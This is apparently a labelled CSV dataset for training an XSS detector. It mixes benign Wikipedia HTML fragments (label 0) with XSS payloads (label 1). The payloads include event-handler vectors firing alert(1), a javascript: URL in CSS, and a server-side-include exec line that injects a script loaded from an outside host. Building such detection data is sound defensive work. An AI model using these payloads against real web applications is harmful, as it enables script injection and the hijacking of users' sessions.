,kod,label
904,"<style>@keyframes x{}</style><form style=""animation-name:x"" onanimationend=""alert(1)""></form>",1
905,"<ul onbeforecut=""alert(1)"" contenteditable>test</ul>",1
906,"<embed onclick=""alert(1)"">test</embed>",1
907,<map id=x tabindex=1 onfocus=alert(1)></map>,1
908,"<ul><li><a href=""/wiki/Unmanned_aerial_vehicle"" title=""Unmanned aerial vehicle"">aerial </a> </li>",0
909,"<acronym draggable=""true"" ondragenter=""alert(1)"">test</acronym>",1
910,"	 </span> </a> </li>",0
911,"<STYLE>li {list-style-image: url(""javascript:alert('')"");}</STYLE><UL><LI></br>",1
912,<li id=x tabindex=1 onbeforeactivate=alert(1)></li>,1
913,<object onpointerout=alert(1)>XSS</object>,1
914,<input3 onpointerleave=alert(1)>XSS</input3>,1
915,"<html onkeydown=""alert(1)"" contenteditable>test</html>",1
916,<image3 onpointerenter=alert(1)>XSS</image3>,1
917,<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>,1
918,"<caption onmouseup=""alert(1)"">test</caption>",1
919,"<nextid onbeforecut=""alert(1)"" contenteditable>test</nextid>",1
920,"<style>@keyframes slidein {}</style><tfoot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tfoot>",1
921,<spacer id=x tabindex=1 onactivate=alert(1)></spacer>,1
922,"<div draggable=""true"" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable>drop here</picture>",1
923,"<li><a href=""/wiki/Statistics"" title=""Statistics"">Statistics </a> </li>",0
924,"<li><a href=""/wiki/Digital_marketing"" title=""Digital marketing"">Digital marketing </a> </li>",0
925,"<col onmousedown=""alert(1)"">test</col>",1
926,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=airesearch.com&amp;rft.atitle=Deep+Neural+Networks+for+Acoustic+Modeling+in+Speech+Recognition&amp;rft.date=2015-10-23&amp;rft.aulast=Research&amp;rft.aufirst=AI&amp;rft_id=http%3A%2F%2Fairesearch.com%2Fai-research-papers%2Fdeep-neural-networks-for-acoustic-modeling-in-speech-recognition%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
927,"<code onkeydown=""alert(1)"" contenteditable>test</code>",1
928,"<li><a href=""/wiki/Imre_Lakatos"" title=""Imre Lakatos"">Imre Lakatos </a> </li>",0
929,"<li><cite id=""CITEREFNeedham1986"" class=""citation book""><a href=""/wiki/Joseph_Needham"" title=""Joseph Needham"">Needham, Joseph </a> (1986). <a href=""/wiki/Science_and_Civilization_in_China"" class=""mw-redirect"" title=""Science and Civilization in China""><i>Science and Civilization in China: Volume 2 </i> </a>. Caves Books Ltd. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Science+and+Civilization+in+China%3A+Volume+2&amp;rft.pub=Caves+Books+Ltd.&amp;rft.date=1986&amp;rft.aulast=Needham&amp;rft.aufirst=Joseph&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
930,<track onpointerenter=alert(1)>XSS</track>,1
931,"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></html>",1
932,<legend onpointerup=alert(1)>XSS</legend>,1
933,"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'""",1
934,"	 </span> <span class=""reference-text""><cite class=""citation news"">Buckley, Chris; Mozur, Paul (22 May 2019). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2019/05/22/world/asia/china-surveillance-xinjiang.html"">""How China Uses High-Tech Surveillance to Subdue Minorities"" </a>. <i>The New York Times </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+York+Times&amp;rft.atitle=How+China+Uses+High-Tech+Surveillance+to+Subdue+Minorities&amp;rft.date=2019-05-22&amp;rft.aulast=Buckley&amp;rft.aufirst=Chris&amp;rft.au=Mozur%2C+Paul&amp;rft_id=https%3A%2F%2Fwww.nytimes.com%2F2019%2F05%2F22%2Fworld%2Fasia%2Fchina-surveillance-xinjiang.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
935,"	 </span> <span class=""toctext"">Search and optimization ",0
936,<nobr onpointerdown=alert(1)>XSS</nobr>,1
937,"<div draggable=""true"" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable>drop here</slot>",1
938,"<link onmouseover=""alert(1)"">test</link>",1
939," </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Mathematics<br />of computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
940,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
941,"<li><a href=""/wiki/Panpsychism"" title=""Panpsychism"">Panpsychism </a> </li>",0
942," </p><p>Simple exhaustive searches<sup id=""cite_ref-Uninformed_search_188-0"" class=""reference""><a href=""#cite_note-Uninformed_search-188"">&#91;184&#93; </a> </sup> are rarely sufficient for most real-world problems: the <a href=""/wiki/Search_algorithm"" title=""Search algorithm"">search space </a> (the number of places to search) quickly grows to <a href=""/wiki/Astronomically_large"" class=""mw-redirect"" title=""Astronomically large"">astronomical numbers </a>. The result is a search that is <a href=""/wiki/Computation_time"" class=""mw-redirect"" title=""Computation time"">too slow </a> or never completes. The solution, for many problems, is to use ""<a href=""/wiki/Heuristics"" class=""mw-redirect"" title=""Heuristics"">heuristics </a>"" or ""rules of thumb"" that prioritize choices in favor of those that are more likely to reach a goal and to do so in a shorter number of steps. In some search methodologies heuristics can also serve to entirely eliminate some choices that are unlikely to lead to a goal (called ""<a href=""/wiki/Pruning_(algorithm)"" class=""mw-redirect"" title=""Pruning (algorithm)"">pruning </a> the <a href=""/wiki/Search_tree"" title=""Search tree"">search tree </a>""). <a href=""/wiki/Heuristics"" class=""mw-redirect"" title=""Heuristics"">Heuristics </a> supply the program with a ""best guess"" for the path on which the solution lies.<sup id=""cite_ref-Informed_search_189-0"" class=""reference""><a href=""#cite_note-Informed_search-189"">&#91;185&#93; </a> </sup> Heuristics limit the search for solutions into a smaller sample size.<sup id=""cite_ref-FOOTNOTETecuci2012_130-1"" class=""reference""><a href=""#cite_note-FOOTNOTETecuci2012-130"">&#91;127&#93; </a> </sup>",0
943,"	 </span> <span class=""reference-text""><cite class=""citation journal""><a rel=""nofollow"" class=""external text"" href=""https://www.wired.com/2017/05/win-china-alphagos-designers-explore-new-ai/"">""After Win in China, AlphaGo's Designers Explore New AI"" </a>. <i>Wired </i>. 27 May 2017. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170602234726/https://www.wired.com/2017/05/win-china-alphagos-designers-explore-new-ai/"">Archived </a> from the original on 2 June 2017. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wired&amp;rft.atitle=After+Win+in+China%2C+AlphaGo%27s+Designers+Explore+New+AI&amp;rft.date=2017-05-27&amp;rft_id=https%3A%2F%2Fwww.wired.com%2F2017%2F05%2Fwin-china-alphagos-designers-explore-new-ai%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
944,"<base onmousemove=""alert(1)"">test</base>",1
945,"	 </span></a></dt><dd>Customize the input and output of your spiders.</dd>",0
946,<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>,1
947,"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">Artificial general intelligence </a> and <a href=""/wiki/AI-complete"" title=""AI-complete"">AI-complete </a> </div>",0
948,"<bdo oncopy=""alert(1)"" contenteditable>test</bdo>",1
949,"<style>@keyframes slidein {}</style><sub style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></sub>",1
950,"<ul><li><a href=""/wiki/Network_architecture"" title=""Network architecture"">Network architecture </a> </li>",0
951,"<dl class=""docutils"">",0
952,"	 </span> <span class=""reference-text"">The most dramatic case of sub-symbolic AI being pushed into the background was the devastating critique of <a href=""/wiki/Perceptron"" title=""Perceptron"">perceptrons </a> by <a href=""/wiki/Marvin_Minsky"" title=""Marvin Minsky"">Marvin Minsky </a> and <a href=""/wiki/Seymour_Papert"" title=""Seymour Papert"">Seymour Papert </a> in 1969. See <a href=""/wiki/History_of_AI"" class=""mw-redirect"" title=""History of AI"">History of AI </a>, <a href=""/wiki/AI_winter"" title=""AI winter"">AI winter </a>, or <a href=""/wiki/Frank_Rosenblatt"" title=""Frank Rosenblatt"">Frank Rosenblatt </a>. ",0
953,<input2 onpointerout=alert(1)>XSS</input2>,1
954,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=WIRED&amp;rft.atitle=World%27s+First+Self-Driving+Semi-Truck+Hits+the+Road&amp;rft.date=2015-05-05&amp;rft.aulast=Davies&amp;rft.aufirst=Alex&amp;rft_id=https%3A%2F%2Fwww.wired.com%2F2015%2F05%2Fworlds-first-self-driving-semi-truck-hits-road%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
955,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Kaplan, Andreas; Haenlein, Michael (1 January 2019). ""Siri, Siri, in my hand: Who's the fairest in the land? On the interpretations, illustrations, and implications of artificial intelligence"". <i>Business Horizons </i>. <b>62 </b> (1): 15–25. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.bushor.2018.08.004"">10.1016/j.bushor.2018.08.004 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Business+Horizons&amp;rft.atitle=Siri%2C+Siri%2C+in+my+hand%3A+Who%27s+the+fairest+in+the+land%3F+On+the+interpretations%2C+illustrations%2C+and+implications+of+artificial+intelligence&amp;rft.volume=62&amp;rft.issue=1&amp;rft.pages=15-25&amp;rft.date=2019-01-01&amp;rft_id=info%3Adoi%2F10.1016%2Fj.bushor.2018.08.004&amp;rft.aulast=Kaplan&amp;rft.aufirst=Andreas&amp;rft.au=Haenlein%2C+Michael&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
956,"<li><a href=""/wiki/Pierre_Duhem"" title=""Pierre Duhem"">Pierre Duhem </a> </li>",0
957,"<iframe draggable=""true"" ondragstart=""alert(1)"">test</iframe>",1
958, </li>,0
959,"<menuitem oncopy=""alert(1)"" contenteditable>test</menuitem>",1
960,<frameset><frame id=x onfocus=alert(1)>,1
961,<animate onpointerout=alert(1)>XSS</animate>,1
962,<frame onpointerleave=alert(1)>XSS</frame>,1
963,<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>,1
964,"<menu onmouseup=""alert(1)"">test</menu>",1
965,"<multicol onclick=""alert(1)"">test</multicol>",1
966,"	 </span> 2015 ",0
967,"<li id=""cite_note-4""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-4"">^ </a> </b> ",0
968,"This list of intelligent traits is based on the topics covered by the major AI textbooks, including:",0
969,"<li><a href=""/wiki/Software_repository"" title=""Software repository"">Software repository </a> </li> </ul>",0
970,"<picture oncopy=""alert(1)"" contenteditable>test</picture>",1
971,<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>,1
972,<picture id=x tabindex=1 onactivate=alert(1)></picture>,1
973,"<plaintext onmouseout=""alert(1)"">test</plaintext>",1
974, ,0
975,</div>,0
976,"<sup onmouseout=""alert(1)"">test</sup>",1
977,"<content oncut=""alert(1)"" contenteditable>test</content>",1
978,<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>,1
979,"<style>@keyframes x{}</style><mark style=""animation-name:x"" onanimationend=""alert(1)""></mark>",1
980,"<div role=""search"">",0
981,"<basefont oncut=""alert(1)"" contenteditable>test</basefont>",1
982,"           <div itemprop=""articleBody"">     ",0
983,<dir onpointermove=alert(1)>XSS</dir>,1
984,"<div draggable=""true"" contenteditable>drag me</div><u ondragover=alert(1) contenteditable>drop here</u>",1
985,"<li><a href=""/wiki/Mathematical_optimization"" title=""Mathematical optimization"">Search methodology </a> </li>",0
986,<dfn onpointermove=alert(1)>XSS</dfn>,1
987,"<li><a href=""/wiki/Social_software"" title=""Social software"">Social information systems </a> </li>",0
988,"<li><a href=""/wiki/Andrew_Yang"" title=""Andrew Yang"">Andrew Yang </a> </li>",0
989,"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationend=""alert(1)""></select>",1
990,"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/"">""The case against killer robots, from a guy actually working on artificial intelligence"" </a>. <i>Fusion.net </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160204175716/http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/"">Archived </a> from the original on 4 February 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">31 January ",0
991, </li>,0
992,<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>,1
993,"	 </span>",0
994,"<audio onbeforepaste=""alert(1)"" contenteditable>test</audio>",1
995,"<div id=""p-personal"" role=""navigation"" class="""" aria-labelledby=""p-personal-label"">",0
996,"<frameset onpaste=""alert(1)"" contenteditable>test</frameset>",1
997,<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>,1
998,"<li id=""cite_note-260""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-260"">^ </a> </b> ",0
999,"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cell&amp;rft.atitle=Identifying+Medical+Diagnoses+and+Treatable+Diseases+by+Image-Based+Deep+Learning&amp;rft.volume=172&amp;rft.issue=5&amp;rft.pages=1122-1131.e9&amp;rft.date=2018&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cell.2018.02.010&amp;rft_id=info%3Apmid%2F29474911&amp;rft.aulast=Kermany&amp;rft.aufirst=D&amp;rft.au=Goldbaum%2C+M&amp;rft.au=Zhang%2C+Kang&amp;rft_id=https%3A%2F%2Fwww.cell.com%2Faction%2FcaptchaChallenge%3FredirectUri%3D%252Fcell%252Fpdf%252FS0092-8674%252818%252930154-5.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0
1000,<embed id=x tabindex=1 onbeforedeactivate=alert(1)></embed><input autofocus>,1
1001,"<dir draggable=""true"" ondragend=""alert(1)"">test</dir>",1
1002,"<samp onkeydown=""alert(1)"" contenteditable>test</samp>",1
1003,"	 <div style=""padding:0em 0.25em"">",0
1004,"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
1005,<img onpointerleave=alert(1)>XSS</img>,1
1006,"<li id=""cite_note-202""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-202"">^ </a> </b> ",0
1007,"and have been a persistent theme in <a href=""/wiki/Science_fiction"" title=""Science fiction"">science fiction </a>.",0
1008,"	 </span> </li>",0
1009,<label id=x tabindex=1 onfocus=alert(1)></label>,1
1010,"<li><a href=""/wiki/Decision_support_system"" title=""Decision support system"">Decision support system </a> </li>",0
1011,"<p onkeydown=""alert(1)"" contenteditable>test</p>",1
1012,<nobr id=x tabindex=1 onactivate=alert(1)></nobr>,1
1013,"<div draggable=""true"" contenteditable>drag me</div><address ondrop=alert(1) contenteditable>drop here</address>",1
1014,<cite onpointerenter=alert(1)>XSS</cite>,1
1015,"<blockquote onmouseover=""alert(1)"">test</blockquote>",1
1016,"	 </span> </h4>",0
1017,"<link draggable=""true"" ondragenter=""alert(1)"">test</link>",1
1018,        </div>,0
1019,"<output onmouseout=""alert(1)"">test</output>",1
1020,"<basefont draggable=""true"" ondragenter=""alert(1)"">test</basefont>",1
